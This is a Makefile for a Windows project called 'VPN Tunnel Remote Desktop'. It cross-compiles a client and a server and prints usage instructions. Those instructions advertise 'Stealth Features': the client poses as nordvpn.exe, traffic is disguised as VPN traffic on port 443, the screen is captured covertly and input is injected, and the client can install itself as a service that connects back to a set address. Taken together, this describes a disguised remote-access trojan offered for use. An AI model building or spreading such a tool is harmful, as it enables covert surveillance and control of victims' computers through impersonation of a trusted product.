# VPN Tunnel Remote Desktop - Windows Build
# Optimized for Windows-only deployment

# Compiler settings
# Use MinGW cross-compiler so the project can be built on Linux CI
# while targeting Windows executables
CXX = x86_64-w64-mingw32-g++
CXXFLAGS = -std=c++17 -O2 -Wall -DWIN32_LEAN_AND_MEAN

# Windows executables
CLIENT_EXE = nordvpn.exe
SERVER_EXE = server.exe

# Windows libraries
CLIENT_LIBS = -lws2_32 -ld3d11 -ldxgi -lntdll -lgdi32 -luser32 -static
SERVER_LIBS = -luser32 -lgdi32 -lcomctl32 -lws2_32 -static

# Source files
CLIENT_SRC = client.cpp
SERVER_SRC = server.cpp

# Build targets
.PHONY: all clean client server info help

all: info client server

info:
	@echo "=============================================="
	@echo "VPN Tunnel Remote Desktop - Windows Build"
	@echo "=============================================="
	@echo "Compiler: $(CXX)"
	@echo "Flags: $(CXXFLAGS)"
	@echo "Target: Windows (MinGW/MSYS2)"
	@echo ""

client: $(CLIENT_EXE)

server: $(SERVER_EXE)

$(CLIENT_EXE): $(CLIENT_SRC)
	@echo "🔨 Building VPN client (nordvpn.exe)..."
	$(CXX) $(CXXFLAGS) $(CLIENT_SRC) -o $(CLIENT_EXE) $(CLIENT_LIBS)
	@echo "✅ Client built: $(CLIENT_EXE)"

$(SERVER_EXE): $(SERVER_SRC)
	@echo "🔨 Building VPN server (server.exe)..."
	$(CXX) $(CXXFLAGS) $(SERVER_SRC) -o $(SERVER_EXE) $(SERVER_LIBS)
	@echo "✅ Server built: $(SERVER_EXE)"

clean:
	@echo "🧹 Cleaning build artifacts..."
	-del /Q *.exe 2>nul || rm -f *.exe
	@echo "✅ Clean complete"

# Development targets
rebuild: clean all

test-build: all
	@echo "=============================================="
	@echo "🎯 Build Complete!"
	@echo "=============================================="
	@echo "Client: $(CLIENT_EXE)"
	@echo "Server: $(SERVER_EXE)"
	@echo ""
	@echo "🎯 EASY USAGE (Double-click):"
	@echo "  1. Double-click $(SERVER_EXE) to start server on port 443"
	@echo "  2. Double-click $(CLIENT_EXE) to connect with GUI prompt"
	@echo ""
	@echo "🔧 Advanced Usage:"
	@echo "  Server: $(SERVER_EXE) [custom_port]"
	@echo "  Client: $(CLIENT_EXE) console 192.168.88.3 443"
	@echo "  Service: $(CLIENT_EXE) install 192.168.88.3 443"
	@echo ""
	@echo "🛡️ Stealth Features:"
	@echo "  • VPN-disguised traffic (port 443)"
	@echo "  • Process name: nordvpn.exe"
	@echo "  • Low-level screen capture (D3D11)"
	@echo "  • NT API input injection"
	@echo ""

help:
	@echo "Available targets:"
	@echo "  all      - Build both nordvpn.exe and server.exe"
	@echo "  client   - Build nordvpn.exe only"
	@echo "  server   - Build server.exe only"
	@echo "  clean    - Remove built executables"
	@echo "  rebuild  - Clean and build all"
	@echo "  test-build - Build and show usage info"
	@echo "  help     - Show this help message"
	@echo ""
	@echo "Quick start: make all"